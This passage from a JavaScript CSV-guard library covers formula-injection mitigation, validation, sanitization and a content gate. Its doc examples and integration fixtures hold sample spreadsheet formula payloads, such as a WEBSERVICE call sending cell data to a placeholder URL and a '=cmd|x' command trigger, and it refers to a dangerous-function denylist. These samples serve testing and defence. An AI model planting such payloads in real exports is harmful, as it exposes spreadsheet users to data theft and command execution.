            throw _err("csv.schema-range",
              "column " + JSON.stringify(col.name) + " < min at row " + ri);
          }
          if (col.type === "number" && typeof col.max === "number" && v > col.max) {
            throw _err("csv.schema-range",
              "column " + JSON.stringify(col.name) + " > max at row " + ri);
          }
          validatedRow[col.name] = v;
        }
        validated.push(validatedRow);
      }
      return serialize(validated, Object.assign({
        headers: cols.map(function (c) { return c.name; }),
      }, opts));
    },
    validate: function (input, opts) {
      return module.exports.validate(input, Object.assign({ schema: spec }, opts || {}));
    },
    columns: cols,
  };
}

// ---- Module-level entry points ----

/**
 * @primitive  b.guardCsv.serialize
 * @signature  b.guardCsv.serialize(rows, opts?)
 * @since      0.7.5
 * @status     stable
 * @compliance hipaa, pci-dss, gdpr, soc2
 * @related    b.guardCsv.escapeCell, b.guardCsv.gate, b.csv.stringify
 *
 * Emit RFC 4180 CSV from `rows` (array of objects or array of
 * arrays) with the full guard-csv threat catalog applied per cell
 * — formula-prefix mitigation, bidi/null/control handling,
 * trailing-whitespace policy, numeric-precision policy. Doubled-
 * quote escape is delegated to `b.csv.stringify`. Caps enforced:
 * `maxRows`, `maxCellBytes`, `maxColumns`, `maxTotalBytes` (each
 * a positive finite integer; passing `Infinity` throws).
 *
 * When `piiPolicy: "redact"` is set and an `opts.redact` instance
 * is passed (typically `b.redact.create(...)`), every emitted
 * string cell is run through `redact.string(...)` before
 * stringification. The HIPAA / PCI-DSS / GDPR postures default
 * `piiPolicy` to `"redact"`.
 *
 * @opts
 *   profile:    "strict"|"balanced"|"permissive"|"email-attachment",
 *   compliancePosture: "hipaa"|"pci-dss"|"gdpr"|"soc2",
 *   headers:    string[]|false,    // explicit column order; false suppresses header row
 *   delimiter:  string,            // default ","
 *   lineEnding: string,            // default "\r\n"
 *   bomPrefix:  boolean,           // prepend U+FEFF (Excel-friendly)
 *   maxRows:    number,            // default 1048576
 *   maxCellBytes:  number,         // default 65536
 *   maxColumns: number,            // default 1024
 *   maxTotalBytes: number,         // default 1073741824 (1 GiB)
 *   piiPolicy:  "preserve"|"redact",
 *   redact:     b.redact instance, // required when piiPolicy === "redact"
 *
 * @example
 *   var out = b.guardCsv.serialize([
 *     { name: "alice", note: "=WEBSERVICE(\"http://x\")" },
 *     { name: "bob",   note: "ok" },
 *   ], { profile: "strict" });
 *
 *   // Formula trigger disarmed with a leading TAB inside the quoted
 *   // field, which is the form OWASP specifies:
 *   out.indexOf("\"\t=WEBSERVICE") !== -1;             // → true
 *   out.indexOf("\r\n") !== -1;                        // → true
 */
function serialize(rows, opts) {
  opts = module.exports.resolveOpts(opts);
  numericBounds.requireAllPositiveFiniteIntIfPresent(opts,
    ["maxRows", "maxCellBytes", "maxTotalBytes"],
    "guardCsv.serialize", GuardCsvError, "csv.bad-opt");

  if (!Array.isArray(rows)) {
    throw _err("csv.bad-input",
      "serialize: rows must be an array, got " + typeof rows);
  }
  if (rows.length > opts.maxRows) {
    throw _err("csv.too-many-rows",
      "row count " + rows.length + " exceeds maxRows " + opts.maxRows);
  }

  var redactor = (opts.piiPolicy === "redact" && opts.redact) ? opts.redact : null;

  // Quoting is part of the formula mitigation, so it is applied when — and
  // only when — the mitigation fired. Quoting unconditionally would grow an
  // ordinary export by about a third for cells that carry no trigger at all,
  // which for a large table can be the difference between fitting under
  // maxTotalBytes and being refused.
  var mitigationApplied = false;
  function _escaped(value) {
    var r = _escapeCell(value, opts);
    if (r.mitigated) mitigationApplied = true;
    return r.value;
  }

  var escapedRows = [];
  for (var ri = 0; ri < rows.length; ri += 1) {
    var row = rows[ri];
    var escapedRow;
    if (Array.isArray(row)) {
      escapedRow = row.map(function (v) {
        var ev = _escaped(v);
        if (Buffer.byteLength(ev, "utf8") > opts.maxCellBytes) {
          throw _err("csv.cell-too-large",
            "cell at row " + ri + " exceeds maxCellBytes " + opts.maxCellBytes);
        }
        if (redactor && typeof ev === "string") ev = redactor.string(ev);
        return ev;
      });
    } else if (row !== null && typeof row === "object") {
      escapedRow = {};
      var keys = Object.keys(row);
      if (keys.length > opts.maxColumns) {
        throw _err("csv.too-many-columns",
          "row " + ri + " has " + keys.length + " columns; max " + opts.maxColumns);
      }
      for (var ki = 0; ki < keys.length; ki += 1) {
        var ev2 = _escaped(row[keys[ki]]);
        if (Buffer.byteLength(ev2, "utf8") > opts.maxCellBytes) {
          throw _err("csv.cell-too-large",
            "cell at row " + ri + " column " + JSON.stringify(keys[ki]) +
            " exceeds maxCellBytes");
        }
        if (redactor && typeof ev2 === "string") ev2 = redactor.string(ev2);
        escapedRow[keys[ki]] = ev2;
      }
    } else {
      throw _err("csv.bad-input", "rows must be arrays or plain objects");
    }
    escapedRows.push(escapedRow);
  }

  // A prefix mitigation only holds INSIDE a quoted field: the default quote
  // rule fires on the delimiter / quote char / CR / LF, so a TAB- or
  // apostrophe-prefixed cell would otherwise be emitted bare. A bare leading
  // TAB is a delimiter under tab-separated import and is trimmed by consumers
  // that strip leading whitespace from unquoted fields — either way the
  // trigger char ends up first again and the mitigation is undone. Quoting is
  // therefore part of the mitigation, not a formatting preference, and an
  // operator cannot switch it off while a prefixing policy is active.
  var out = csv.stringify(escapedRows, {
    delimiter:    opts.delimiter,
    quote:        opts.quote || "\"",
    eol:          opts.lineEnding,
    alwaysQuote:  mitigationApplied || opts.alwaysQuote || false,
    columns:      opts.headers || null,
    header:       opts.headers !== false,
  });

  var totalBytes = Buffer.byteLength(out, "utf8");
  if (opts.bomPrefix) {
    out = BOM_CHAR + out;
    totalBytes += 3;
  }
  if (totalBytes > opts.maxTotalBytes) {
    throw _err("csv.total-too-large",
      "output size " + totalBytes + " bytes exceeds maxTotalBytes " + opts.maxTotalBytes);
  }
  return out;
}

/**
 * @primitive  b.guardCsv.validate
 * @signature  b.guardCsv.validate(input, opts?)
 * @since      0.7.5
 * @status     stable
 * @compliance hipaa, pci-dss, gdpr, soc2
 * @related    b.guardCsv.sanitize, b.guardCsv.gate
 *
 * Inspect `input` (string or Buffer of CSV text) and return
 * `{ ok, issues }`. Each issue carries `{ kind, severity,
 * ruleId, location, snippet }` with severity in
 * `"warn"|"high"|"critical"`. Detected: BOM mid-stream, Unicode
 * bidi override (CVE-2021-42574), C0 control char, null byte,
 * homoglyph, zero-width char, formula-prefix cell (bidi/zero-width
 * leading prefix is stripped before the scan), dangerous-function
 * denylist hit, mixed line endings (when `dialectPolicy: "strict"`).
 * Pure inspection — never mutates input or throws.
 *
 * @opts
 *   profile:    "strict"|"balanced"|"permissive"|"email-attachment",
 *   compliancePosture: "hipaa"|"pci-dss"|"gdpr"|"soc2",
 *   bidiCharPolicy:        "reject"|"strip"|"audit"|"allow",
 *   controlCharPolicy:     "reject"|"strip"|"allow",
 *   nullByteHandling:      "reject"|"strip"|"allow",
 *   homoglyphPolicy:       "audit"|"strip"|"allow",
 *   formulaInjectionPolicy: "prefix-tab"|"prefix-quote"|"wrap-with-quotes-and-prefix"|"reject"|"audit-only"|"allow",
 *   dangerousFunctions:    string[],
 *   dialectPolicy:         "strict"|"permissive",
 *
 * @example
 *   var rv = b.guardCsv.validate("name,formula\r\nalice,=WEBSERVICE(\"x\")\r\n", {
 *     profile: "strict",
 *   });
 *   rv.ok;                                             // → false
 *   rv.issues.some(function (i) { return i.kind === "dangerous-function"; });  // → true
 */
// validate is generated by defineGuard from `detect` (_detectIssues) under the
// "text" input contract — runIssueValidator(input, resolved, _detectIssues,
// "text") — identical to the hand-written wrapper this replaced.

/**
 * @primitive  b.guardCsv.sanitize
 * @signature  b.guardCsv.sanitize(input, opts?)
 * @since      0.7.5
 * @status     stable
 * @related    b.guardCsv.validate, b.guardCsv.gate
 *
 * Best-effort cleanup of `input` (string or Buffer): strips leading
 * BOM (when `bomPrefix: false`), bidi override chars (when
 * `bidiCharPolicy: "strip"`), C0 control chars (when
 * `controlCharPolicy: "strip"`), null bytes (when
 * `nullByteHandling: "strip"`), zero-width and Unicode Tags chars
 * (always), and trailing whitespace per `trailingWhitespacePolicy`.
 *
 * Throws when a character class is set to `"reject"` and the input
 * carries it — `"reject"` refuses, `"strip"` repairs, and sanitize
 * never returns a class the operator asked it to refuse. Refuses
 * pathological expansion: when the sanitized output exceeds
 * `sanitizeAmplificationCap` (default 1.5x) the function throws
 * `GuardCsvError("csv.sanitize-amplified")` — sanitize is a
 * shrinking operation by contract, never a growing one.
 *
 * Note: sanitize does NOT prepend formula-trigger mitigations to
 * cells (that's `b.guardCsv.serialize` / `b.guardCsv.escapeCell`'s
 * job, applied during emission). Use the `gate` action chain for
 * accept-side defense — it sanitizes, re-parses, and re-serializes
 * with the formula mitigation baked in.
 *
 * @opts
 *   profile:    "strict"|"balanced"|"permissive"|"email-attachment",
 *   compliancePosture: "hipaa"|"pci-dss"|"gdpr"|"soc2",
 *   bidiCharPolicy:    "reject"|"strip"|"audit"|"allow",
 *   controlCharPolicy: "reject"|"strip"|"allow",
 *   nullByteHandling:  "reject"|"strip"|"allow",
 *   homoglyphPolicy:   "audit"|"strip"|"allow",
 *   trailingWhitespacePolicy: "trim"|"preserve"|"reject",
 *   sanitizeAmplificationCap: number,   // default 1.5
 *
 * @example
 *   // Build hostile input programmatically so the source stays ASCII.
 *   var ZWSP = String.fromCharCode(0x200B);
 *   var clean = b.guardCsv.sanitize("name,note\r\nalice,hi" + ZWSP + "\r\n", {
 *     profile: "balanced",
 *   });
 *   clean.indexOf(ZWSP) === -1;                        // → true
 */
// sanitize is generated by defineGuard from `sanitizeTransform` (_stripIssues)
// with sanitizeSeverities:[] (strip unconditionally, never refuse on a detected
// issue) and sanitizeAmplificationCap:"sanitizeAmplificationCap" (the "sanitize
// must shrink, never grow" post-condition that throws csv.sanitize-amplified) —
// identical to the hand-written scrubber this replaced.

/**
 * @primitive  b.guardCsv.detect
 * @signature  b.guardCsv.detect(input)
 * @since      0.7.5
 * @status     stable
 * @related    b.guardCsv.validate, b.csv.parse
 *
 * Sniff dialect heuristics from `input` (string or Buffer): most-
 * frequent delimiter on the first line (`","`, `";"`, `"\t"`,
 * `"|"`), dominant line-ending, header presence (first line starts
 * with an ASCII letter), encoding hint (`"utf-8"` vs `"utf-8-sig"`
 * when a leading BOM is present), and a single-pass `dialect`
 * verdict (`"consistent"` vs `"mixed"` line endings). Returns a
 * confidence score in `[0, 1]`. Pure inspection.
 *
 * @example
 *   var d = b.guardCsv.detect("name,age\r\nalice,30\r\nbob,40\r\n");
 *   d.delimiter;                                       // → ","
 *   d.lineEnding;                                      // → "\r\n"
 *   d.hasHeader;                                       // → true
 *   d.encoding;                                        // → "utf-8"
 *   d.dialect;                                         // → "consistent"
 */
function detect(input) {
  var text = typeof input === "string"
    ? input
    : (Buffer.isBuffer(input) ? input.toString("utf8") : null);
  if (text == null) {
    return {
      delimiter: null, hasHeader: false, encoding: null,
      lineEnding: null, dialect: "unknown", confidence: 0,
    };
  }
  var crlf = (text.match(/\r\n/g) || []).length;
  var lfOnly = (text.match(/[^\r]\n/g) || []).length;
  var crOnly = (text.match(/\r[^\n]/g) || []).length;
  var lineEnding = crlf >= lfOnly && crlf >= crOnly
    ? "\r\n"
    : (lfOnly >= crOnly ? "\n" : "\r");
  var firstLine = text.split(/\r\n|\r|\n/)[0] || "";
  var counts = { ",": 0, ";": 0, "\t": 0, "|": 0 };
  for (var i = 0; i < firstLine.length; i += 1) {
    var c = firstLine.charAt(i);
    if (counts[c] !== undefined) counts[c] += 1;
  }
  var delim = ","; var max = 0;
  Object.keys(counts).forEach(function (k) {
    if (counts[k] > max) { max = counts[k]; delim = k; }
  });
  return {
    delimiter:  delim,
    hasHeader:  /^[A-Za-z]/.test(firstLine),
    encoding:   text.charCodeAt(0) === 0xFEFF ? "utf-8-sig" : "utf-8",
    lineEnding: lineEnding,
    dialect:    (crlf > 0 && (lfOnly > 0 || crOnly > 0)) ? "mixed" : "consistent",
    confidence: max > 0 ? 0.9 : 0.5,
  };
}

// ---- Gate factory (b.gateContract shape) ----

/**
 * @primitive  b.guardCsv.gate
 * @signature  b.guardCsv.gate(opts?)
 * @since      0.7.5
 * @status     stable
 * @compliance hipaa, pci-dss, gdpr, soc2
 * @related    b.guardCsv.validate, b.guardCsv.sanitize, b.staticServe.create, b.fileUpload.create
 *
 * Build a `b.gateContract` gate suitable for plugging into
 * `b.staticServe({ contentSafety: { ".csv": gate } })`,
 * `b.fileUpload({ contentSafety: { "text/csv": gate } })`,
 * `b.mail`, or `b.objectStore`. Each finding's action is the one the
 * operator's policy for that class selected: `serve` (no issues) →
 * `audit-only` (observe-only findings) → `sanitize` (a class set to a
 * mitigation — formula `prefix-tab`, bidi/control `strip` — so the gate
 * strips, then re-parses + re-serializes when a formula cell is present so
 * escapeCell's mitigation lands) → `refuse` (a class set to `reject`, the
 * dangerous-function denylist, or an ambiguous mixed dialect). `refuse`
 * wins over `sanitize` wins over `audit-only`.
 *
 * Operator extensibility: pass `operatorRules: [{ id, severity,
 * detect: fn(ctx)→boolean, reason }]` to inject custom detectors
 * alongside the built-in catalog. Rules run best-effort — a
 * throwing detector is silently skipped (the framework cannot
 * crash a request because an operator rule mishandled bytes).
 *
 * @opts
 *   profile:    "strict"|"balanced"|"permissive"|"email-attachment",
 *   compliancePosture: "hipaa"|"pci-dss"|"gdpr"|"soc2",
 *   name:       string,    // gate identity for audit / observability
 *   operatorRules: [{ id: string, severity: "warn"|"high"|"critical",
 *                    detect: function, reason: string }],
 *
 * @example
 *   var csvGate = b.guardCsv.gate({ profile: "strict" });
 *
 *   // Wire into staticServe so every served .csv runs through the gate.
 *   var serve = b.staticServe.create({
 *     root: "/var/data",
 *     contentSafety: { ".csv": csvGate },
 *   });
 *
 *   // A plain formula cell is mitigated in place (strict's formula policy is
 *   // prefix-tab — a cell beginning `=`/`+`/`-`/`@` is prefixed with a TAB so
 *   // spreadsheets render it as text rather than evaluate it):
 *   var formula = Buffer.from("name,formula\r\nalice,=cmd|x\r\n", "utf8");
 *   (await csvGate.check({ bytes: formula })).action;  // → "sanitize"
 *
 *   // A denylisted exfiltration/RCE function refuses — too dangerous to serve
 *   // even prefixed:
 *   var exfil = Buffer.from('a\r\n=WEBSERVICE("http://x/"&A1)\r\n', "utf8");
 *   (await csvGate.check({ bytes: exfil })).action;    // → "refuse"
 */
// Disposition of each csv finding = what the operator's policy for that class
// selected (reject → refuse, a mitigation like prefix-tab/strip → sanitize,
// audit → audit), resolved through gateContract.policyDisposition. The
// dangerous-function denylist and an ambiguous mixed-dialect always refuse —
// neither is safe to serve even after a best-effort mitigation; a stray BOM is
// always strippable; the zero-width / homoglyph observations are audit-only.
// Exhaustive over every kind _detectIssues can emit (the gate-disposition
// coverage test enforces it), so the gate never falls back to severity.
function _gateDispositionFor(issue, opts) {
  switch (issue.kind) {
    case "bidi-override":              return gateContract.policyDisposition(opts.bidiCharPolicy);
    case "control-char":               return gateContract.policyDisposition(opts.controlCharPolicy);
    case "null-byte":                  return gateContract.policyDisposition(opts.nullByteHandling);
    case "formula-prefix-cell":        return gateContract.policyDisposition(opts.formulaInjectionPolicy);
    case "homoglyph":                  return gateContract.policyDisposition(opts.homoglyphPolicy);
    case "bom-mid-stream":             return "sanitize";
    // Both are stripped unconditionally by this guard's sanitizer (it exposes
    // no policy for either), so the gate repairs rather than refuses.
    case "zero-width":                 return "sanitize";
    case "unicode-tags":               return "sanitize";
    case "dangerous-function":         return "refuse";
    case "dialect-mixed-line-endings": return "refuse";
    default:                           return null;
  }
}

// Operator-injected rules run as detect-only findings. The guard owns no
// sanitizer for them, so buildContentGate treats a refusal-severity hit as
// refuse (it cannot serve a "sanitized" output that still carries the rule's
// finding). Best-effort: a throwing detector is skipped — the framework cannot
// crash a request because an operator rule mishandled bytes.
function _gateOperatorIssues(text, opts, ctx) {
  var out = [];
  if (!Array.isArray(opts.operatorRules)) return out;
  for (var i = 0; i < opts.operatorRules.length; i += 1) {
    var rule = opts.operatorRules[i];
    try {
      if (rule.detect && rule.detect({ bytes: text, ctx: ctx })) {
        // Default an operator rule that fires to refusal severity: the gate owns
        // no sanitizer for operator findings, so an unspecified-severity rule
        // BLOCKS by default (the operator wrote it to catch something) — they
        // opt DOWN to "warn" to observe-only, never silently up to serve.
        out.push({
          kind: rule.id, severity: rule.severity || "high",
          ruleId: rule.id, snippet: rule.reason || rule.id,
        });
      }
    } catch (_e) { /* operator rule best-effort */ }
  }
  return out;
}

// Gate sanitize: strip the removable findings, then — when a formula / dangerous
// cell survives the strip — reparse + reserialize so escapeCell applies the
// operator's formula mitigation (prefix-tab / wrap-with-quotes). The mitigation
// is in-place (a TAB-prefixed cell is inert in a spreadsheet but still matches
// the cell-boundary formula scan), so the gate trusts this output rather than
// re-validating it. Returns bytes.
function _gateProduceSanitized(text, opts) {
  var clean = module.exports.sanitize(text, opts);
  var hasFormula = _detectIssues(clean, opts).some(function (i) {
    return i.kind === "formula-prefix-cell" || i.kind === "dangerous-function";
  });
  if (hasFormula) {
    // Read it back under the dialect it was written in. `csv.parse` defaults
    // to a comma, so a semicolon- or tab-delimited document parsed without
    // these lands as one cell per row, and the re-serialized output the gate
    // serves has a different shape from the document it was handed.
    var rows = csv.parse(clean, {
      header:    false,
      delimiter: opts.delimiter,
      quote:     opts.quote || "\"",
    });
    clean = serialize(rows, Object.assign({}, opts, { headers: false }));
  }

  // The sanitizer has to reach a FIXED POINT: whatever it hands back must not
  // still trip the scan that asked for it. Re-serializing mitigates the cells
  // the CONFIGURED dialect produces, and the scan deliberately looks wider —
  // it treats every common delimiter as a boundary because a recipient may
  // open the file under a different dialect. A formula behind one of those
  // other delimiters therefore survives the round trip: `safe;=2+3` in a comma
  // document reparses as one cell, gains no prefix, and would be served with
  // the payload intact under a "sanitize" verdict.
  //
  // It cannot be mitigated either. Prefixing at the interior boundary leaves
  // the alternate reader a bare TAB-led cell, which is the unquoted form this
  // guard refuses on its own terms, and quoting for a dialect we are not
  // writing would rewrite the document's shape. So the honest answer is to
  // refuse what the round trip could not disarm.
  // Walk EVERY formula-leading cell, not the one the scan reports. `detect`
  // returns the first hit only, so a check that inspects that finding alone
  // clears the whole document on the strength of its safest cell — under the
  // allowlist policy an `=SUM(A1)` in the first cell would shield an `=cmd|x`
  // in the next.
  //
  // The allowlist policy leaves a named-safe call unprefixed on purpose, so a
  // cell that is a positively allowlisted call is the configured outcome
  // rather than a failure to disarm. Every other surviving trigger is one the
  // round trip could not neutralize.
  // `allow` and `audit-only` permit formulas by configuration — `detect`
  // suppresses the finding for them — so there is nothing here to fail to
  // disarm. Without this the document is refused whenever some UNRELATED
  // repairable issue (a zero-width character, a stray BOM) is what sent it
  // through the sanitizer at all. The dangerous-function denylist below is a
  // separate axis and still applies.
  var residual = null;
  var formulasPermitted = opts.formulaInjectionPolicy === "allow" ||
                          opts.formulaInjectionPolicy === "audit-only";
  if (!formulasPermitted) _eachCellStart(clean, opts.quote || "\"",
    _cellDelimiters(opts.delimiter),
    function (at) {
      var quoted = clean.charAt(at) === (opts.quote || "\"");
      var triggerAt = quoted ? at + 1 : at;
      var ch = clean.charAt(triggerAt);
      if (ch === "" || FORMULA_PREFIXES.indexOf(ch) === -1) return false;
      if (!quoted && _isLineTerminator(ch)) return false;
      if (quoted && ch === "\t" && opts.formulaInjectionPolicy === "prefix-tab") return false;
      if (opts.formulaInjectionPolicy === "allowlist") {
        var name = _leadingFunctionName(clean.slice(triggerAt));
        if (name !== null && opts.formulasAllowlist.some(function (fn) {
          return String(fn).toUpperCase() === name.toUpperCase();
        })) return false;
      }
      residual = { index: triggerAt, char: ch };
      return true;
    });
  if (residual === null) {
    var dangerous = _detectIssues(clean, opts).filter(function (i) {
      return i.kind === "dangerous-function";
    });
    if (dangerous.length > 0) residual = { snippet: dangerous[0].snippet };
  }
  if (residual !== null) {
    throw _err("csv.formula-injection",
      "sanitize cannot disarm " +
      JSON.stringify(residual.snippet ||
        ("cell beginning with " + JSON.stringify(residual.char) +
         " at offset " + residual.index)) +
      " without rewriting the document for a dialect it is not emitting");
  }
  return Buffer.from(clean, "utf8");
}

function gate(opts) {
  opts = module.exports.resolveOpts(opts);
  return gateContract.buildContentGate({
    name:             opts.name || "guardCsv:" + (opts.profile || "default"),
    opts:             opts,
    validate:         module.exports.validate,
    dispositionFor:   _gateDispositionFor,
    extraIssues:      _gateOperatorIssues,
    produceSanitized: _gateProduceSanitized,
  });
}

// buildProfile / compliancePosture / loadRulePack are assembled by
// gateContract.defineGuard below (makeProfileBuilder(PROFILES) /
// lookupCompliancePosture(_, COMPLIANCE_POSTURES) / makeRulePackLoader).
// Their wiki sections render from the single-sourced @abiTemplate blocks
// in gate-contract.js, instantiated per guard by the page generator.

// ---- adaptive integration-test fixtures (consumed by layer-5 host harness) ----
var INTEGRATION_FIXTURES = Object.freeze({
  kind:        "content",
  contentType: "text/csv",
  extension:   ".csv",
  benignBytes: Buffer.from("name,age\r\nalice,30\r\n", "utf8"),
  // Hostile: a cell invokes a denylisted exfiltration function (WEBSERVICE) —
  // an RCE / data-exfil vector too dangerous to serve even mitigated, so the
  // gate refuses (a plain formula prefix-cell would instead be sanitized in
  // place by the strict profile's prefix-tab policy).
  hostileBytes: Buffer.from('name,formula\r\nalice,=WEBSERVICE("http://x/"&A1)\r\n', "utf8"),
});

// Assembled from the gate-contract guard factory: error class, registry
// exports (NAME / KIND / MIME_TYPES / EXTENSIONS / INTEGRATION_FIXTURES),
// buildProfile / compliancePosture / loadRulePack wiring, plus the
// per-guard inspection surface (validate / sanitize / gate) and CSV
// extras (serialize / escapeCell / detect / schema / FORMULA_PREFIXES /
// DANGEROUS_FUNCTIONS) passed through verbatim. The bespoke `gate` carries
// CSV's sanitize-reparse-reserialize chain unchanged.
module.exports = gateContract.defineGuard({
  name:        "csv",
  kind:        "content",
  errorClass:  GuardCsvError,
  profiles:    PROFILES,
  defaults:    DEFAULTS,
  postures:    COMPLIANCE_POSTURES,
  mimeTypes:   ["text/csv"],
  extensions:  [".csv"],
  integrationFixtures: INTEGRATION_FIXTURES,
  // validate + sanitize generated from detect/sanitizeTransform. "text" input
  // contract (string/Buffer→utf8, bad-input otherwise — _detectIssues returns
  // [] on a non-string, so the contract owns the refusal). sanitizeSeverities
  // [] strips unconditionally; sanitizeAmplificationCap enforces shrink.
  inputContract:            "text",
  detect:                   _detectIssues,
  sanitizeTransform:        _stripIssues,
  sanitizeSeverities:       [],
  sanitizeAmplificationCap: "sanitizeAmplificationCap",
  gate:        gate,
  extra: {
    _gateDispositionForTest: _gateDispositionFor,
    serialize:           serialize,
    escapeCell:          escapeCell,
    detect:              detect,
    schema:              schema,
    FORMULA_PREFIXES:    FORMULA_PREFIXES,
    DANGEROUS_FUNCTIONS: DANGEROUS_FUNCTIONS,
  },
});
